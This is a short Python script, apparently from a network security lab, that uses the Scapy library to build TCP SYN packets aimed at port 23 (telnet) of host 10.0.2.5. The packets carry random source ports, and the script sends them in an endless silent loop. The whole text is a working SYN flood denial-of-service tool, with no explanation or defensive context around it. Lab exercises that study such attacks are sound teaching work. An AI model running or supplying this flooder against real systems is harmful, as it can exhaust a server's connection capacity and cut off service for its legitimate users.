from scapy.all import *

syn = IP(dst = "10.0.2.5") / TCP (sport = RandShort (),
dport = 23, flags = "S")

while True :
	send (syn, verbose = False)